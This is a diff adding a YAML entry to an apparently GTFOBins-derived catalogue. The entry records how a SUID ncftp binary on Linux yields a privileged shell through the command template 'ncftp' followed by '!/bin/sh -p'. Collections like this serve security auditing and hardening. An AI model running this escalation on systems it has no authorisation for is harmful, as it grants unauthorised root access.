@@ -1,0 +1,26 @@
+id: gtfobins/ncftp/shell/suid
+type: binary
+platform: linux
+name: ncftp
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'ncftp
+
+    !/bin/sh -p'
+references:
+- https://gtfobins.github.io/gtfobins/ncftp/
+tags:
+- linux
+- unix
+- gtfobins
